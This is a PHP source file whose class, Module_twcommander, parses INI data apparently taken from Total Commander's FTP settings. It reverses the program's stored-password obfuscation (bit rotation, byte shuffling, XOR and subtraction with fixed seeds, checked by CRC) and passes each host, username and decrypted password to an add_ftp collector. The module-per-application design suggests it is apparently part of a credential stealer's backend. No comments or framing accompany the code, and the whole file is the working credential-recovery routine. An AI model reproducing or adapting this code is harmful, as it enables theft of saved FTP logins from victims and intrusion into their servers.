<?php
class Module_twcommander extends Module_
{
    protected function Decrypt($pass)
    {
        if (strlen($pass) <= 0)
            return "";

        if ($pass[0] == "!")
        {
            //Masterpass
            return "";
        }

        if ((strlen($pass) % 2) != 0 || strlen($pass) <= 4)
        {
            return "";
        }

        $data = hex2bin($pass);
        if ($data === false)
        {
            return "";
        }

        $crc = substr($data, strlen($data)-4);
        $data = substr($data, 0, -4);
        $seed = 0xcf671;

        for ($i = 0; $i < strlen($data); $i++)
        {
            $k = myrand(8, $seed);
            $data[$i] = chr(((ord($data[$i]) << $k) & 0xff | (ord($data[$i]) >> (8-$k)) & 0xff ) & 0xff);
        }

        $seed = 0x3039;
        for ($i = 0; $i < 256; $i++)
        {
            $k = myrand(strlen($data), $seed);
            $p = myrand(strlen($data), $seed);
            $c = $data[$k];
            $data[$k] = $data[$p];
            $data[$p] = $c;
        }

        $seed = 0xa564;
        for ($i = 0; $i < strlen($data); $i++)
            $data[$i] = chr(ord($data[$i]) ^ myrand(0x100, $seed));

        $seed = 0xd431;
        for ($i = 0; $i < strlen($data); $i++)
            $data[$i] = chr(ord($data[$i]) + 0x100 - myrand(0x100, $seed));

        if (crc32b_str($data) != data_int32($crc))
        {
            return "";
        }

        return $data;
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $INI_ = parse_ini($Data);
			if($INI_ == NULL)
				return;
			
            foreach ($INI_ as $Section)
            {
                if (!is_array($Section))
                    continue;
				
				if(isset($Section["host"]))
				{
					$Host = Assign_($Section["host"]);
					$User = Assign_($Section["username"]);
					$Pass = $this->Decrypt($Section["password"]);
					
					$this->add_ftp($Host, $User, $Pass);
				}
            }
			
			$INI_ = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

